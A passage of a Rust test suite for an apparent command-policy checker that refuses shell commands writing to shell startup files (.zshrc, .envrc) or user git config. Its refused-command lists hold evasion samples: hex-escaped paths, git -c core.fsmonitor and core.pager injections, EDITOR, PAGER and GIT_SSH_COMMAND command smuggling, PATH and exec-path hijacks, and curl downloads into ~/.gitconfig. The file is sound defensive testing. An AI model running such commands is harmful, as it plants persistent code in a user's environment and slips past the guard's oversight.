        "cat ~/.zshrc | column -t | nl | tail -3",
        "cat ~/.zshrc | xxd | head",
        "cat ~/.zshrc | base64",
        "cat ~/.zshrc | jq -R .",
        "cat ~/.zshrc | tee out.txt",
        "cat ~/.zshrc | git hash-object --stdin",
        "git log --oneline | head; git status",
        "git commit -F - <<'EOF'\nfix: handle .envrc\nEOF",
        "git diff -- .envrc | head",
        "cd crates && cat ~/.zshrc | wc -l",
        "grep -c alias ~/.zshrc > b.txt; sed -i 's/a/b/' README.md",
        "grep -c alias ~/.zshrc > b.txt; awk -F: '{print $1}' b.txt",
        "grep -c alias ~/.zshrc > b.txt; timeout 5 ls",
        "grep -c alias ~/.zshrc > b.txt; find . -name '*.rs' -print",
        "grep -c alias ~/.zshrc > b.txt; /bin/cat b.txt",
        "grep -c alias ~/.zshrc > b.txt; git config --get user.name",
        "cat <(echo hello)",
        "diff <(echo a) <(echo b)",
        "make test",
        "sed -i 's/a/b/' README.md",
    ] {
        if refused(&f.judge(command)) {
            wrong.push(format!("refused: {command}"));
        }
    }
    assert!(wrong.is_empty(), "{}", wrong.join("\n"));
}

/// Grok design check. A git subcommand that takes its path list from produced
/// text (`--pathspec-from-file=-`, `--stdin`, an interactive `-p`) lets that
/// text pick the files git rewrites or deletes, so it is not a data reader.
/// Plain git commands that only name their files stay allowed.
#[test]
fn git_reading_paths_from_produced_text_is_not_a_reader() {
    let f = Fixture::new();
    let mut wrong = Vec::new();
    for command in [
        "printf 'sub/.envrc\\n' | git checkout --pathspec-from-file=-",
        "printf 'sub/.envrc\\n' | git checkout HEAD --pathspec-from-file -",
        "printf 'sub/.envrc\\n' | git restore --source=HEAD --worktree --pathspec-from-file=-",
        "printf 'sub/.envrc\\n' | git rm -q --pathspec-from-file=-",
        "printf 'sub/.envrc\\n' | git reset --pathspec-from-file=-",
        "printf 'sub/.envrc\\n' | git add --pathspec-from-file=-",
        "printf 'sub/.envrc\\n' | git stash push --pathspec-from-file=-",
        "printf 'sub/.envrc\\n' > list; git checkout --pathspec-from-file=list",
        "printf 'sub/.envrc\\n' | git checkout-index --stdin",
        "printf 'sub/.envrc\\n' | git update-index --stdin",
        "printf 'sub/.envrc\\n' | git update-index --index-info",
        "printf 'sub/.envrc\\n' | git hash-object -w --stdin",
        "printf 'sub/.envrc\\n' | git hash-object -w --stdin-paths",
        "printf 'create refs/heads/x HEAD # .envrc\\n' | git update-ref --stdin",
        "printf 'sub/.envrc\\n' | git rev-list --stdin",
        "printf 'sub/.envrc\\n' | git filter-branch --index-filter cat",
        "echo .envrc > /dev/null; printf 'y\\n' | git checkout -p",
        "echo .envrc > /dev/null; printf 'y\\n' | git restore --patch",
        "echo .envrc > /dev/null; printf 'y\\n' | git clean -fdi",
        "printf 'sub/.envrc\\n' | git stash -p",
    ] {
        if !refused(&f.judge(command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    for command in [
        "git commit -F - <<'EOF'\nfix: handle .envrc\nEOF",
        "git diff -- .envrc | head",
        "git log -p --oneline | head",
        "git log -i --grep envrc | head",
        "git grep -i envrc | head",
        "git status; git log --oneline | head",
        "grep -c alias ~/.zshrc > b.txt; git add README.md",
        "grep -c alias ~/.zshrc > b.txt; git checkout -b feature",
        "grep -c alias ~/.zshrc > b.txt; git restore --staged README.md",
        "grep -c alias ~/.zshrc > b.txt; git commit -am wip",
        "grep alias ~/.zshrc | sort | uniq | head",
        "diff <(cat ~/.zshrc) <(cat ~/.bashrc)",
    ] {
        if refused(&f.judge(command)) {
            wrong.push(format!("refused: {command}"));
        }
    }
    assert!(wrong.is_empty(), "{}", wrong.join("\n"));
}

/// The false refusals the allowlist admits, named in the AC-7 clause: lines
/// that only read still refuse when they name a class file, produce text and
/// run a program that is not a listed data reader, and the refusal says to
/// read the file in its own call.
#[test]
fn ordinary_lines_with_a_non_reader_refuse_by_design() {
    let f = Fixture::new();
    let mut wrong = Vec::new();
    for command in [
        "grep alias ~/.zshrc > b.txt; cp b.txt docs/a.txt",
        "grep alias ~/.zshrc > b.txt; cargo test",
        "grep alias ~/.zshrc | vim -",
        "grep alias ~/.zshrc | awk '/a|b/ {print}'",
        "grep alias ~/.zshrc | sed 's|a|b|'",
        "grep alias ~/.zshrc | busybox awk '{print $1}'",
    ] {
        let verdict = f.judge(command);
        if !refused(&verdict)
            || !verdict
                .iter()
                .any(|v| v.message.contains("read the file in its own call"))
        {
            wrong.push(format!("not refused with the rewrite: {command}"));
        }
    }
    for command in [
        "grep alias ~/.zshrc",
        "grep alias ~/.zshrc | awk '{print $2}'",
        "grep alias ~/.zshrc | sed 's/a/b/'",
    ] {
        if refused(&f.judge(command)) {
            wrong.push(format!("refused: {command}"));
        }
    }
    assert!(wrong.is_empty(), "{}", wrong.join("\n"));
}

/// Grok round six. Quoting reaches every check decoded (`$'\\x2ezshrc'`,
/// `'.zs''hrc'`, `$"..."`), and a command-valued setting that names a class
/// file refuses on every line: a global `git -c` or `--config-env`, and
/// `EDITOR`, `GIT_EDITOR`, `PAGER`, `GIT_SSH_COMMAND`, `LESSOPEN` and the
/// like, whether or not the line produces text.
#[test]
fn quoting_is_decoded_and_command_valued_settings_are_read() {
    let f = Fixture::new();
    let mut wrong = Vec::new();
    for command in [
        "grep alias ~/.zshrc | awk $'BEGIN{printf \"awk-rc\\n\" \\x3e (ENVIRON[\"HOME\"] \"/\\x2ezshrc\")}'",
        "bash -c $'echo pwned \\x3e\\x3e \\x24HOME/\\x2ezshrc'",
        "zsh -c $'echo pwned \\x3e\\x3e \\x24HOME/\\x2ezshrc'",
        "python3 -c $'import os; open(os.environ[\"HOME\"]+\"/\\x2ezshrc\",\"a\").write(\"py-pwned\\n\")'",
        "echo x >> $HOME/$'\\x2ezshrc'",
        "echo x >> \"$HOME\"/$'\\x2ezshrc'",
        "echo x >> $HOME/$'\\056zshrc'",
        "echo x >> $HOME/$'\\u002ezshrc'",
        "echo x | tee $HOME/$'\\x2ezshrc'",
        "echo x >> ~/'.zs''hrc'",
        "echo x >> ~/.z\"s\"hrc",
        "echo x >> ~/.zshr$\"c\"",
        "echo x >> ~/.zs\\\nhrc",
        "echo $'\\'' ; echo x >> ~/.zshrc; echo '",
        "printf '%s' $'\\x78' | tee ~/.zshrc",
        "git -c core.fsmonitor='echo pwned >> ~/.zshrc' status",
        "git -c core.pager='sh -c \"echo >> ~/.zshrc\"' log",
        "FSM='echo >> ~/.zshrc' git --config-env=core.fsmonitor=FSM status",
        "GIT_EDITOR='echo pwned >> ~/.zshrc' git commit --allow-empty",
        "GIT_EDITOR='echo pwned >> $HOME/.zshrc' git commit --allow-empty",
        "EDITOR='echo pwned >> ~/.zshrc' git commit --allow-empty",
        "VISUAL='echo pwned >> ~/.zshrc' git commit --allow-empty",
        "export VISUAL='echo >> ~/.zshrc'; git commit --allow-empty",
        "PAGER='cat >> ~/.zshrc' git log",
        "GIT_PAGER='cat >> ~/.zshrc' git log",
        "GIT_SSH_COMMAND='echo >> ~/.zshrc' git fetch",
        "GIT_EXTERNAL_DIFF='echo >> ~/.zshrc' git diff",
        "LESSOPEN='|echo >> ~/.zshrc %s' less README.md",
        "MANPAGER='cat >> ~/.zshrc' man ls",
        "BROWSER='echo >> ~/.zshrc' open x",
        "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.fsmonitor GIT_CONFIG_VALUE_0='echo >> ~/.zshrc' git status",
        "env GIT_EDITOR='echo >> ~/.zshrc' git commit --allow-empty",
        "export FSM='echo >> ~/.zshrc'; git --config-env core.fsmonitor=FSM status",
    ] {
        if !refused(&f.judge(command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    for command in [
        "git status",
        "git log -p -- .envrc | head",
        "git diff -- .envrc",
        "echo hello | make",
        "cargo test",
        "grep alias ~/.zshrc | awk '{print $2}'",
        "git -c color.ui=never status",
        "git -c user.name=x commit -m wip",
        "git -c core.editor=true rebase main",
        "EDITOR=vim git commit",
        "PAGER=less git log",
        "export EDITOR=vim",
        "GIT_SSH_COMMAND='ssh -i key' git fetch",
        "echo $'a\\tb'",
        "printf $'%s\\n' x",
        "echo $'it\\'s'; ls",
        "awk $'{print $1}' README.md",
        "echo $'\\x68\\x69' > notes.txt",
        "echo x >> $'notes.txt'",
        "echo x > ~/'notes.txt'",
        "cat ~/$'\\x2ezshrc'",
        "grep alias ~/.zshrc | sed $'s/a/b/'",
    ] {
        if refused(&f.judge(command)) {
            wrong.push(format!("refused: {command}"));
        }
    }
    assert!(wrong.is_empty(), "{}", wrong.join("\n"));
}

/// Grok round seven. A git global setting or a command-valued variable is
/// read by value: it refuses when the value names a class file, or when it
/// cannot be read on a line that names one, or when it is a command other
/// than a bare viewer on a staged line. An innocent `-c color.ui=never`,
/// `EDITOR=vim` or `PAGER=less` leaves a read of `.envrc` a read. An
/// assignment that only uses `$HOME`, `${HOME}`, `$ZDOTDIR`,
/// `$XDG_CONFIG_HOME` or an earlier assigned name is substituted, so
/// `F=$HOME/.zshrc GIT_EDITOR='echo x >> $F'` names the file.
#[test]
fn git_settings_are_judged_by_key_kind_and_commands_by_their_words() {
    let f = Fixture::new();
    let mut wrong = Vec::new();
    for command in [
        "git -c core.gitProxy='echo x >> ~/.zshrc' fetch",
        "git -c core.gitProxy='sh /tmp/r.sh' log -p -- .envrc | head",
        "git -c include.path=/tmp/x log -p -- .envrc | head",
        "git -c includeIf.gitdir:/a/.path=/tmp/x log -p -- .envrc | head",
        "git -c remote.o.uploadpack=/tmp/r.sh log -p -- .envrc | head",
        "git -c remote.o.receivepack=/tmp/r.sh log -p -- .envrc | head",
        "git -c mystery.key=1 log -p -- .envrc | head",
        "git -c core.pager='sh /tmp/r.sh' log -p -- .envrc | head",
        "git -c pager.log='sh /tmp/r.sh' log -p -- .envrc | head",
        "git -c core.fsmonitor=/tmp/r.sh status -- .envrc | head",
        "git -c color.ui='echo x >> ~/.zshrc' log",
        "git -c user.name='$(echo x >> ~/.zshrc)' log",
        "C=1 git --config-env mystery.key=C log -p -- .envrc | head",
        "C=1 git --config-env=mystery.key=C log -p -- .envrc | head",
        "C='sh /tmp/r.sh' git --config-env core.gitProxy=C log -p -- .envrc | head",
        "C='sh /tmp/r.sh' git --config-env=core.gitProxy=C log -p -- .envrc | head",
        "C=1 git --config-env include.path=C log -p -- .envrc | head",
        "C='sh /tmp/r.sh' git --config-env core.pager=C log -p -- .envrc | head",
        "C='sh /tmp/r.sh' git --config-env=core.pager=C log -p -- .envrc | head",
        "git --config-env color.ui=C log -p -- .envrc | head",
        "git --config-env color.ui=NOPE log -p -- .envrc | head",
        "git --config-env=color.ui=NOPE log -p -- .envrc | head",
        "C=~/.zshrc git --config-env color.ui=C log",
        "C=~/.zshrc git --config-env=color.ui=C log",
        "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.gitProxy GIT_CONFIG_VALUE_0='sh /tmp/r.sh' git log -p -- .envrc | head",
        "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=mystery.key GIT_CONFIG_VALUE_0=1 git log -p -- .envrc | head",
        "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=include.path GIT_CONFIG_VALUE_0=/tmp/x git log -p -- .envrc | head",
        "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.pager GIT_CONFIG_VALUE_0='sh /tmp/r.sh' git log -p -- .envrc | head",
        "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=color.ui GIT_CONFIG_VALUE_0=~/.zshrc git log",
        "GIT_CONFIG_VALUE_0=1 git log -p -- .envrc | head",
        "EDITOR='sh /tmp/r.sh' git log -p -- .envrc | head",
        "GIT_EDITOR='echo pwned >> ~/.zshrc' git log -p -- .envrc | head",
        "EDITOR='vim -S /tmp/r.vim' git log -p -- .envrc | head",
        "EDITOR='vim -c !sh' git log -p -- .envrc | head",
        "EDITOR='vim +!sh' git log -p -- .envrc | head",
        "EDITOR='vim -R; sh /tmp/r.sh' git log -p -- .envrc | head",
        "EDITOR='vim -R $(sh /tmp/r.sh)' git log -p -- .envrc | head",
        "GIT_SSH_COMMAND='ssh -o ProxyCommand=sh' git log -p -- .envrc | head",
        "GIT_SSH_COMMAND='ssh -o ProxyCommand=sh' git fetch; cat ~/.zshrc | head",
        "GIT_EXTERNAL_DIFF='diff ~/.zshrc' git log -p -- .envrc | head",
        "EDITOR='vim -R /tmp/x.sh' git log -p -- .envrc | head",
        "EDITOR='code -w ~/.zshrc' git commit --allow-empty",
        "git --exec-path /tmp/x log -p -- .envrc | head",
        "git --exec-path '' log -p -- .envrc | head",
        "git --exec-path= log -p -- .envrc | head",
        "git --exec-path ~/.zshrc log",
        "git --exec-path /tmp/x diff -- .envrc | head",
    ] {
        if !refused(&f.judge(command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    for command in [
        "git -c color.ui=always log -p -- .envrc | head",
        "git -c core.fsmonitorHookVersion=2 log -p -- .envrc | head",
        "git -c clean.requireForce=yes log -p -- .envrc | head",
        "git -c color.pager=yes log -p -- .envrc | head",
        "git -c pager.log=1 log -p -- .envrc | head",
        "git -c pager.log=false log -p -- .envrc | head",
        "git -c user.name=Ann -c user.email=a@b.c log -p -- .envrc | head",
        "git -c diff.renames=true log -p -- .envrc | head",
        "git -c core.commentChar=';' log -p -- .envrc | head",
        "git -c merge.ff=false log -p -- .envrc | head",
        "git -c core.whitespace=trailing-space log -p -- .envrc | head",
        "git -c core.pager=less log -p -- .envrc | head",
        "git -c core.pager='less -R' log -p -- .envrc | head",
        "C=always git --config-env color.ui=C log -p -- .envrc | head",
        "C=always git --config-env=color.ui=C log -p -- .envrc | head",
        "C=always git --config-env diff.renames=C log -p -- .envrc | head",
        "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=color.ui GIT_CONFIG_VALUE_0=always git log -p -- .envrc | head",
        "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=color.ui GIT_CONFIG_VALUE_0=always git log -- src/a.rs",
        "EDITOR='code -w' git log -p -- .envrc | head",
        "EDITOR='vim -R' git log -p -- .envrc | head",
        "EDITOR=vim git log -p -- .envrc | head",
        "GIT_SSH_COMMAND='ssh -o BatchMode=yes' git log -p -- .envrc | head",
        "GIT_EXTERNAL_DIFF=diff git log -p -- .envrc | head",
        // Without `=`, `--exec-path` takes no value (git prints its program
        // directory and exits), so only the `=` form sets the directory.
        "git --exec-path=/usr/bin diff -- .envrc",
        "git --exec-path=/usr/lib/git-core log -p -- .envrc | head",
        "git --exec-path /tmp/x log -- src/a.rs",
    ] {
        if refused(&f.judge(command)) {
            wrong.push(format!("refused: {command}"));
        }
    }
    assert!(wrong.is_empty(), "{}", wrong.join("\n"));
}

#[test]
fn pagers_and_diffs_take_their_own_letters() {
    // Review rounds nine and ten: `less` and `diff` take their own letters
    // that need no value, run together; vim keeps its refused letters.
    let f = Fixture::new();
    let mut wrong = Vec::new();
    for command in [
        "EDITOR='vim -u /tmp/x' git log -p -- .envrc | head",
        "EDITOR='vim -S /tmp/x' git log -p -- .envrc | head",
        "EDITOR='vim -c :!id' git log -p -- .envrc | head",
        "EDITOR='vim -s' git log -p -- .envrc | head",
        "EDITOR='vim -S' git log -p -- .envrc | head",
        "EDITOR='less -ofile' git log -p -- .envrc | head",
        "EDITOR='less -k keys' git log -p -- .envrc | head",
        "EDITOR='less +!id' git log -p -- .envrc | head",
        "GIT_EXTERNAL_DIFF='diff -l' git log -p -- .envrc | head",
        "GIT_EXTERNAL_DIFF='diff -uS x' git log -p -- .envrc | head",
        "git -c log.follow=true log -p -- .envrc | head",
        "git -c submodule.x.update='!sh /tmp/r.sh' log -p -- .envrc | head",
    ] {
        if !refused(&f.judge(command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    for command in [
        "GIT_EXTERNAL_DIFF='diff -u' git log -p -- .envrc | head",
        "GIT_EXTERNAL_DIFF='colordiff -uw' git log -p -- .envrc | head",
        "EDITOR='less -RF' git log -p -- .envrc | head",
        "PAGER='less -RFX' git log -p -- .envrc | head",
        "git -c core.pager='less -RF' log -p -- .envrc | head",
        "git -c log.date=iso log -p -- .envrc | head",
        "git -c submodule.x.update=checkout log -p -- .envrc | head",
        "C=never git --config-env color.ui=C --attr-source HEAD log -p -- .envrc | head",
    ] {
        if refused(&f.judge(command)) {
            wrong.push(format!("refused: {command}"));
        }
    }
    assert!(wrong.is_empty(), "{}", wrong.join("\n"));
}

#[test]
fn settings_and_variables_are_read_by_value() {
    let f = Fixture::new();
    let mut wrong = Vec::new();
    for command in [
        "F=$HOME/.zshrc GIT_EDITOR='echo pwned >> $F' git commit --allow-empty",
        "F=$HOME/.zshrc git -c core.fsmonitor='echo pwned >> $F' status",
        "A=$HOME; F=$A/.zshrc; GIT_EDITOR='echo pwned >> $F' git commit --allow-empty",
        "export F=$HOME/.zshrc; EDITOR='echo x >> $F' git commit --allow-empty",
        "export A=${HOME}; export F=${A}/.zshrc; VISUAL='echo >> $F' git commit --allow-empty",
        "F=$HOME/.zshrc; git -c core.pager='cat >> $F' log",
        "F=$HOME/.zshrc FSM='echo >> $F' git --config-env=core.fsmonitor=FSM status",
        "git -c core.fsmonitor='echo pwned >> ~/.zshrc' status",
        "git -c core.pager='sh -c \"echo >> ~/.zshrc\"' log",
        "git -c core.pager=\"$P\" log -- .envrc",
        "printf 'echo x >> src/.envrc\\n' > r.sh; PAGER='sh r.sh' git log",
        "printf 'echo x >> src/.envrc\\n' > r.sh; EDITOR='sh r.sh' git commit --allow-empty",
        "printf 'echo x >> src/.envrc\\n' > r.sh; GIT_SSH_COMMAND='sh r.sh' git fetch",
        "printf 'echo x >> src/.envrc\\n' > r.sh; git -c core.pager='sh r.sh' log",
        "printf 'echo x >> src/.envrc\\n' > r.sh; git -c core.fsmonitor='sh r.sh' status",
        "printf 'echo x >> src/.envrc\\n' > r.sh; git -c alias.x='!sh r.sh' x",
        "printf 'echo x >> src/.envrc\\n' > r.sh; git --exec-path=. status",
        "printf 'echo x >> src/.envrc\\n' > cat; PATH=. cat README.md",
        "printf 'echo x >> src/.envrc\\n' > r.sh; GIT_EXEC_PATH=. git status",
        "printf 'echo x >> src/.envrc\\n' > r.sh; GIT_CONFIG_GLOBAL=r.cfg git status",
        "EDITOR=vim GIT_EDITOR='echo x >> ~/.zshrc' git commit --allow-empty",
    ] {
        if !refused(&f.judge(command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    for command in [
        "git -c color.ui=never diff -- .envrc",
        "git -c user.name=x diff -- .envrc",
        "git -c core.pager=less log -- .envrc",
        "git --exec-path=/usr/bin diff -- .envrc",
        "git -c color.ui=never log -p -- .envrc | head",
        "git -c core.pager=less log -p -- .envrc | head",
        "EDITOR=vim git log -p -- .envrc | head",
        "PAGER=less git log -p -- .envrc | head",
        "PAGER=less git log -1",
        "EDITOR=vim git diff -- .envrc",
        "F=~/.zshrc GIT_EDITOR=vim git diff -- .envrc",
        "F=$HOME/notes GIT_EDITOR=vim git diff -- .envrc",
        "git status",
        "git diff -- .envrc",
        "cargo test",
        "git -c color.ui=never status",
        "echo hello | git -c color.ui=never log",
        "A=$HOME; ls $A",
        "grep alias ~/.zshrc | awk '{print $2}'",
    ] {
        if refused(&f.judge(command)) {
            wrong.push(format!("refused: {command}"));
        }
    }
    assert!(wrong.is_empty(), "{}", wrong.join("\n"));
}

/// Review round 16: the default user and system git configuration files
/// are a second class of the same check. A write refuses under
/// `git.hook_integrity` at its level and names that class; reads, a copy
/// out and `git config`, whose file and key git-guard judges, pass; at
/// `off` the class is left to git-guard.
#[test]
fn user_git_config_writes_refuse_under_hook_integrity() {
    let f = Fixture::new();
    let mut wrong = Vec::new();
    for command in [
        "curl -s -o ~/.gitconfig https://example.invalid/x",
        "curl -s --output $HOME/.config/git/config https://example.invalid/x",
        "wget -q -O H/.gitconfig https://example.invalid/x",
        "ditto payload.txt ~/.gitconfig",
        "patch ~/.gitconfig payload.diff",
        "tar -cf ~/.gitconfig payload.txt",
        "touch /etc/gitconfig",
        "printf x >> /opt/homebrew/etc/gitconfig",
        "cd \"$NOWHERE\" && printf x >> .gitconfig",
        "git -c core.fsmonitor='printf x >> ~/.gitconfig' status",
        "GIT_CONFIG_KEY_0=core.fsmonitor GIT_CONFIG_VALUE_0='printf x >> ~/.gitconfig' git status",
        "cat ~/.gitconfig; zip -TT x a.zip payload.txt",
        "curl -o ~/.config/git/config https://example.invalid/x",
        "vim git/config",
    ] {
        let found = f.judge(command);
        let named = found.iter().any(|v| {
            v.rule == "git.hook_integrity"
                && v.level == PolicyLevel::Block
                && v.message.contains("user or system git config file")
                && !v.message.contains("shell startup")
        });
        if !named {
            wrong.push(format!("{command}: {found:?}"));
        }
    }
    for command in [
        "cat ~/.gitconfig",
        "grep alias ~/.gitconfig",
        "sed -n 1p ~/.gitconfig",
        "cp ~/.gitconfig backup.txt",
        "git config --global user.name x",
        "git config --file ~/.gitconfig user.name x",
        "curl -o out.txt https://example.invalid/x",
        // Review round 17: `git/config` ends the path it names.
        "vim src/git/config.rs",
        "vim docs/git/config.md",
        "git commit -m \"document src/git/config.rs\"",
    ] {
        let found = f.judge(command);
        if !found.is_empty() {
            wrong.push(format!("refused: {command}: {found:?}"));
        }
    }
    let warn = evaluate_with(
        "touch ~/.gitconfig",
        &f.project,
        &f.startup_env(),
        PolicyLevel::Warn,
    );
    if !warn.iter().all(|v| v.level == PolicyLevel::Warn) || warn.is_empty() {
        wrong.push(format!("warn level: {warn:?}"));
    }
    let off = evaluate_with(
        "touch ~/.gitconfig",
        &f.project,
        &f.startup_env(),
        PolicyLevel::Off,
    );
    if !off.is_empty() {
        wrong.push(format!("off level: {off:?}"));
    }
    assert!(wrong.is_empty(), "{}", wrong.join("\n"));
}
